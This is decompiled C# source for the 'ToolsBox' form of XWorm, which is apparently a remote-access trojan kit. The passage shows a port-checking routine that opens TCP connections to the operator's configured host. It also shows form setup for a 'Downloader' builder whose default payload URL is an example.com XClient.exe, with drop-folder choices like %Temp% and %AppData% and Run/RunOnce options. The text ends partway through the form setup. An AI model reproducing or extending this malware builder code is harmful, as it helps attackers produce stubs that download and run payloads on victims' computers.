#define DEBUG
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SimpleObfuscator;
using XWorm.My;


namespace XWorm;

[DesignerGenerated]
public class ToolsBox : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__217_002D0
	{
		public int _0024VB_0024Local_Port;

		public ToolsBox _0024VB_0024Me;

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			try
			{
				if (Operators.CompareString(_0024VB_0024Me.method_0(), "127.0.0.1", TextCompare: false) == 0)
				{
					_0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Green;
					_0024VB_0024Me.Guna2TextBox4.Text = "Success: I can see your service on 127.0.0.1 on port " + Conversions.ToString(_0024VB_0024Local_Port);
					if (GClass19.bool_0)
					{
						MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Accepted 127.0.0.1:" + Conversions.ToString(_0024VB_0024Local_Port);
						MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
					}
					return;
				}
				_0024VB_0024Me.tcpClient_0 = new TcpClient();
				_0024VB_0024Me.tcpClient_0.Connect(GClass19.string_2, _0024VB_0024Local_Port);
				_0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Green;
				_0024VB_0024Me.Guna2TextBox4.Text = "Success: I can see your service on " + GClass19.string_2 + " on port " + Conversions.ToString(_0024VB_0024Local_Port);
				if (GClass19.bool_0)
				{
					MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Accepted " + GClass19.string_2 + ":" + Conversions.ToString(_0024VB_0024Local_Port);
					MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
				}
				_0024VB_0024Me.tcpClient_0?.Close();
				_0024VB_0024Me.tcpClient_0 = null;
			}
			catch (SocketException projectError)
			{
				ProjectData.SetProjectError(projectError);
				_0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Red;
				_0024VB_0024Me.Guna2TextBox4.Text = "Error: I could not see your service on " + GClass19.string_2 + " on port " + Conversions.ToString(_0024VB_0024Local_Port);
				if (GClass19.bool_0)
				{
					MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Refused " + GClass19.string_2 + ":" + Conversions.ToString(_0024VB_0024Local_Port);
					MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
				}
				_0024VB_0024Me.tcpClient_0?.Close();
				_0024VB_0024Me.tcpClient_0 = null;
				ProjectData.ClearProjectError();
			}
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_217_PortCheck : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal int _0024VB_0024Local_Port;

		internal ToolsBox _0024VB_0024Me;

		internal _Closure_0024__217_002D0 _Closure_0024__217_002D0_0;

		internal Exception _0024VB_0024ResumableLocal_ex_00241;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num > 1u)
				{
					_Closure_0024__217_002D0_0 = new _Closure_0024__217_002D0();
					_Closure_0024__217_002D0_0._0024VB_0024Me = _0024VB_0024Me;
					_Closure_0024__217_002D0_0._0024VB_0024Local_Port = _0024VB_0024Local_Port;
				}
				try
				{
					TaskAwaiter awaiter;
					switch (num)
					{
						default:
							awaiter = Task.Run([SpecialName] () =>
							{
								try
								{
									if (Operators.CompareString(_Closure_0024__217_002D0_0._0024VB_0024Me.method_0(), "127.0.0.1", TextCompare: false) == 0)
									{
										_Closure_0024__217_002D0_0._0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Green;
										_Closure_0024__217_002D0_0._0024VB_0024Me.Guna2TextBox4.Text = "Success: I can see your service on 127.0.0.1 on port " + Conversions.ToString(_Closure_0024__217_002D0_0._0024VB_0024Local_Port);
										if (GClass19.bool_0)
										{
											MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Accepted 127.0.0.1:" + Conversions.ToString(_Closure_0024__217_002D0_0._0024VB_0024Local_Port);
											MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
										}
									}
									else
									{
										_Closure_0024__217_002D0_0._0024VB_0024Me.tcpClient_0 = new TcpClient();
										_Closure_0024__217_002D0_0._0024VB_0024Me.tcpClient_0.Connect(GClass19.string_2, _Closure_0024__217_002D0_0._0024VB_0024Local_Port);
										_Closure_0024__217_002D0_0._0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Green;
										_Closure_0024__217_002D0_0._0024VB_0024Me.Guna2TextBox4.Text = "Success: I can see your service on " + GClass19.string_2 + " on port " + Conversions.ToString(_Closure_0024__217_002D0_0._0024VB_0024Local_Port);
										if (GClass19.bool_0)
										{
											MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Accepted " + GClass19.string_2 + ":" + Conversions.ToString(_Closure_0024__217_002D0_0._0024VB_0024Local_Port);
											MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
										}
										_Closure_0024__217_002D0_0._0024VB_0024Me.tcpClient_0?.Close();
										_Closure_0024__217_002D0_0._0024VB_0024Me.tcpClient_0 = null;
									}
								}
								catch (SocketException projectError)
								{
									ProjectData.SetProjectError(projectError);
									_Closure_0024__217_002D0_0._0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Red;
									_Closure_0024__217_002D0_0._0024VB_0024Me.Guna2TextBox4.Text = "Error: I could not see your service on " + GClass19.string_2 + " on port " + Conversions.ToString(_Closure_0024__217_002D0_0._0024VB_0024Local_Port);
									if (GClass19.bool_0)
									{
										MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Refused " + GClass19.string_2 + ":" + Conversions.ToString(_Closure_0024__217_002D0_0._0024VB_0024Local_Port);
										MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
									}
									_Closure_0024__217_002D0_0._0024VB_0024Me.tcpClient_0?.Close();
									_Closure_0024__217_002D0_0._0024VB_0024Me.tcpClient_0 = null;
									ProjectData.ClearProjectError();
								}
							}).GetAwaiter();
							if (!awaiter.IsCompleted)
							{
								num = 0;
								_0024State = 0;
								_0024A0 = awaiter;
								ref AsyncVoidMethodBuilder reference = ref _0024Builder;
								VB_0024StateMachine_217_PortCheck stateMachine = this;
								reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
								return;
							}
							break;
						case 1:
							num = -1;
							_0024State = -1;
							return;
						case 0:
							num = -1;
							_0024State = -1;
							awaiter = _0024A0;
							_0024A0 = default(TaskAwaiter);
							break;
					}
					awaiter.GetResult();
					awaiter = default(TaskAwaiter);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					_0024VB_0024ResumableLocal_ex_00241 = ex2;
					_0024VB_0024Me.Guna2TextBox4.ForeColor = Color.Red;
					_0024VB_0024Me.Guna2TextBox4.Text = _0024VB_0024ResumableLocal_ex_00241.Message;
					ProjectData.ClearProjectError();
				}
				_0024VB_0024Me.Guna2GradientButton2.Enabled = true;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton2")]
	private Guna2GradientButton _Guna2GradientButton2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton4")]
	private Guna2GradientButton _Guna2GradientButton4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton3")]
	private Guna2GradientButton _Guna2GradientButton3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("L1")]
	private ListView _L1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton5")]
	private Guna2GradientButton _Guna2GradientButton5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox1")]
	private Guna2CheckBox _Guna2CheckBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2CheckBox2")]
	private Guna2CheckBox _Guna2CheckBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AddToolStripMenuItem1")]
	private ToolStripMenuItem _AddToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RemoveToolStripMenuItem1")]
	private ToolStripMenuItem _RemoveToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TrueToolStripMenuItem")]
	private ToolStripMenuItem _TrueToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FalseToolStripMenuItem")]
	private ToolStripMenuItem _FalseToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TrueToolStripMenuItem1")]
	private ToolStripMenuItem _TrueToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FalseToolStripMenuItem1")]
	private ToolStripMenuItem _FalseToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton6")]
	private Guna2GradientButton _Guna2GradientButton6;

	public static string string_0 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	public static Random random_0 = new Random();

	public static object object_0 = smethod_1(random_0.Next(3, 16));

	public static string string_1;

	public static string string_2;

	public static string string_3;

	private static string string_4 = "-=>";

	private TcpClient tcpClient_0;

	[field: AccessedThroughProperty("Guna2TabControl1")]
	public Guna2TabControl Guna2TabControl1
	;

	[field: AccessedThroughProperty("TabPage1")]
	public TabPage TabPage1
	;
	[field: AccessedThroughProperty("TabPage2")]
	public TabPage TabPage2
	;

	[field: AccessedThroughProperty("TabPage3")]
	public TabPage TabPage3
	;
	[field: AccessedThroughProperty("TabPage4")]
	public TabPage TabPage4
;
	[field: AccessedThroughProperty("ImageList1")]
	public ImageList ImageList1
	;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	[field: AccessedThroughProperty("Guna2TextBox1")]
	public Guna2TextBox Guna2TextBox1
	;

	[field: AccessedThroughProperty("Guna2TextBox2")]
	public Guna2TextBox Guna2TextBox2
	;

	[field: AccessedThroughProperty("Label2")]
	public Label Label2
	;

	public Guna2GradientButton Guna2GradientButton1
	;

	[field: AccessedThroughProperty("Label3")]
	public Label Label3
;

	[field: AccessedThroughProperty("Guna2ComboBox1")]
	public Guna2ComboBox Guna2ComboBox1
	;

	[field: AccessedThroughProperty("SaveFileDialog1")]
	public SaveFileDialog SaveFileDialog1
	;
	public Guna2GradientButton Guna2GradientButton2
;

	[field: AccessedThroughProperty("Guna2TextBox3")]
	public Guna2TextBox Guna2TextBox3
	;

	[field: AccessedThroughProperty("Label4")]
	public Label Label4
	;

	[field: AccessedThroughProperty("Guna2TextBox4")]
	public Guna2TextBox Guna2TextBox4
	;

	[field: AccessedThroughProperty("Guna2TextBox6")]
	public Guna2TextBox Guna2TextBox6
	;
	[field: AccessedThroughProperty("Label6")]
	public Label Label6
;

	[field: AccessedThroughProperty("Guna2TextBox5")]
	public Guna2TextBox Guna2TextBox5
	;

	[field: AccessedThroughProperty("Label5")]
	public Label Label5
	;

	public Guna2GradientButton Guna2GradientButton4
	;

	public Guna2GradientButton Guna2GradientButton3
	;
	[field: AccessedThroughProperty("PictureBox2")]
	public PictureBox PictureBox2
	;

	public ListView L1
	;

	[field: AccessedThroughProperty("ColumnHeader1")]
	public ColumnHeader ColumnHeader1
	;

	[field: AccessedThroughProperty("ColumnHeader2")]
	public ColumnHeader ColumnHeader2
	;
	[field: AccessedThroughProperty("ColumnHeader3")]
	public ColumnHeader ColumnHeader3
	;
	[field: AccessedThroughProperty("ColumnHeader4")]
	public ColumnHeader ColumnHeader4
	;

	[field: AccessedThroughProperty("Guna2Panel2")]
	public Guna2Panel Guna2Panel2
	;

	public Guna2GradientButton Guna2GradientButton5
	;

	[field: AccessedThroughProperty("Label7")]
	public Label Label7
	;
	[field: AccessedThroughProperty("Guna2ComboBox2")]
	public Guna2ComboBox Guna2ComboBox2
	;

	public Guna2CheckBox Guna2CheckBox1
	;

	public Guna2CheckBox Guna2CheckBox2
	;
	[field: AccessedThroughProperty("PictureBox3")]
	public PictureBox PictureBox3
	;

	[field: AccessedThroughProperty("Guna2CheckBox3")]
	public Guna2CheckBox Guna2CheckBox3
	;

	[field: AccessedThroughProperty("Guna2ContextMenuStrip2")]
	public Guna2ContextMenuStrip Guna2ContextMenuStrip2
	;

	public ToolStripMenuItem AddToolStripMenuItem1
;

	public ToolStripMenuItem RemoveToolStripMenuItem1
;

	public ToolStripMenuItem ToolStripMenuItem7
;

	[field: AccessedThroughProperty("ImageList2")]
	public ImageList ImageList2
	;

	[field: AccessedThroughProperty("RunningToolStripMenuItem")]
	public ToolStripMenuItem RunningToolStripMenuItem
	;

	[field: AccessedThroughProperty("RunonceToolStripMenuItem")]
	public ToolStripMenuItem RunonceToolStripMenuItem
	;

	public ToolStripMenuItem TrueToolStripMenuItem
;

	public ToolStripMenuItem FalseToolStripMenuItem
	;
	public ToolStripMenuItem TrueToolStripMenuItem1
;

	public ToolStripMenuItem FalseToolStripMenuItem1
	;

	public Guna2GradientButton Guna2GradientButton6;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.ToolsBox));
		this.Guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.Label3 = new System.Windows.Forms.Label();
		this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label2 = new System.Windows.Forms.Label();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.L1 = new System.Windows.Forms.ListView();
		this.ColumnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader3 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader4 = new System.Windows.Forms.ColumnHeader();
		this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.AddToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoveToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.RunningToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TrueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FalseToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RunonceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TrueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.FalseToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ImageList2 = new System.Windows.Forms.ImageList(this.components);
		this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2CheckBox3 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.PictureBox3 = new System.Windows.Forms.PictureBox();
		this.Guna2CheckBox2 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Guna2CheckBox1 = new Guna.UI2.WinForms.Guna2CheckBox();
		this.Label7 = new System.Windows.Forms.Label();
		this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.PictureBox2 = new System.Windows.Forms.PictureBox();
		this.Guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton6 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2TextBox6 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label6 = new System.Windows.Forms.Label();
		this.Guna2TextBox5 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label5 = new System.Windows.Forms.Label();
		this.TabPage4 = new System.Windows.Forms.TabPage();
		this.Guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.SaveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
		this.Guna2TabControl1.SuspendLayout();
		this.TabPage1.SuspendLayout();
		this.TabPage2.SuspendLayout();
		this.Guna2ContextMenuStrip2.SuspendLayout();
		this.Guna2Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).BeginInit();
		this.TabPage3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).BeginInit();
		this.TabPage4.SuspendLayout();
		base.SuspendLayout();

		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Guna2GradientButton2.Click += new System.EventHandler(Guna2GradientButton2_Click);
		this.Guna2GradientButton3.Click += new System.EventHandler(Guna2GradientButton3_Click);
		this.Guna2GradientButton4.Click += new System.EventHandler(Guna2GradientButton4_Click);
		this.Guna2GradientButton5.Click += new System.EventHandler(Guna2GradientButton5_Click);
		this.L1.DragDrop += new System.Windows.Forms.DragEventHandler(L1_DragDrop);
		this.L1.DragEnter += new System.Windows.Forms.DragEventHandler(L1_DragEnter);
		this.L1.KeyDown += new System.Windows.Forms.KeyEventHandler(L1_KeyDown);
		this.Guna2CheckBox1.CheckedChanged += new System.EventHandler(Guna2CheckBox1_CheckedChanged);
		this.Guna2CheckBox2.CheckedChanged += new System.EventHandler(Guna2CheckBox2_CheckedChanged);
		this.AddToolStripMenuItem1.Click += new System.EventHandler(AddToolStripMenuItem1_Click);
		this.ToolStripMenuItem7.Click += new System.EventHandler(ToolStripMenuItem7_Click);
		this.RemoveToolStripMenuItem1.Click += new System.EventHandler(RemoveToolStripMenuItem1_Click);
		this.TrueToolStripMenuItem.Click += new System.EventHandler(TrueToolStripMenuItem_Click);
		this.FalseToolStripMenuItem.Click += new System.EventHandler(FalseToolStripMenuItem_Click);
		this.TrueToolStripMenuItem1.Click += new System.EventHandler(TrueToolStripMenuItem1_Click);
		this.FalseToolStripMenuItem1.Click += new System.EventHandler(FalseToolStripMenuItem1_Click);
		this.Guna2GradientButton6.Click += new System.EventHandler(Guna2GradientButton6_Click);



		this.Guna2TabControl1.Controls.Add(this.TabPage1);
		this.Guna2TabControl1.Controls.Add(this.TabPage2);
		this.Guna2TabControl1.Controls.Add(this.TabPage3);
		this.Guna2TabControl1.Controls.Add(this.TabPage4);
		this.Guna2TabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2TabControl1.ImageList = this.ImageList1;
		this.Guna2TabControl1.ItemSize = new System.Drawing.Size(120, 30);
		this.Guna2TabControl1.Location = new System.Drawing.Point(0, 0);
		this.Guna2TabControl1.Name = "Guna2TabControl1";
		this.Guna2TabControl1.SelectedIndex = 0;
		this.Guna2TabControl1.Size = new System.Drawing.Size(495, 311);
		this.Guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(216, 214, 228);
		this.Guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(216, 214, 228);
		this.Guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.Black;
		this.Guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.Empty;
		this.Guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
		this.Guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.Black;
		this.Guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TabControl1.TabButtonSize = new System.Drawing.Size(120, 30);
		this.Guna2TabControl1.TabIndex = 44;
		this.Guna2TabControl1.TabMenuBackColor = System.Drawing.Color.White;
		this.Guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
		this.TabPage1.BackColor = System.Drawing.Color.White;
		this.TabPage1.Controls.Add(this.Label3);
		this.TabPage1.Controls.Add(this.Guna2ComboBox1);
		this.TabPage1.Controls.Add(this.Guna2GradientButton1);
		this.TabPage1.Controls.Add(this.Guna2TextBox2);
		this.TabPage1.Controls.Add(this.Label2);
		this.TabPage1.Controls.Add(this.Guna2TextBox1);
		this.TabPage1.Controls.Add(this.Label1);
		this.TabPage1.ImageKey = "icons8_tree_segtructure_32.png";
		this.TabPage1.Location = new System.Drawing.Point(4, 34);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.TabPage1.Size = new System.Drawing.Size(487, 273);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "Downloader";
		this.Label3.AutoSize = true;
		this.Label3.Location = new System.Drawing.Point(43, 135);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(36, 13);
		this.Label3.TabIndex = 52;
		this.Label3.Text = "Path :";
		this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.BorderRadius = 3;
		this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox1.ItemHeight = 15;
		this.Guna2ComboBox1.Items.AddRange(new object[6] { "%Temp%", "%AppData%", "%Userprofile%", "%Public%", "%ProgramData%", "%LocalAppdata%" });
		this.Guna2ComboBox1.Location = new System.Drawing.Point(86, 131);
		this.Guna2ComboBox1.Name = "Guna2ComboBox1";
		this.Guna2ComboBox1.Size = new System.Drawing.Size(357, 21);
		this.Guna2ComboBox1.TabIndex = 51;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton1.Image");
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(86, 158);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(357, 34);
		this.Guna2GradientButton1.TabIndex = 50;
		this.Guna2GradientButton1.Text = "Build";
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "XClient.exe";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Location = new System.Drawing.Point(86, 104);
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(357, 21);
		this.Guna2TextBox2.TabIndex = 46;
		this.Label2.AutoSize = true;
		this.Label2.Location = new System.Drawing.Point(23, 108);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(56, 13);
		this.Label2.TabIndex = 45;
		this.Label2.Text = "Filename :";
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "http://www.example.com/XClient.exe";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(86, 77);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
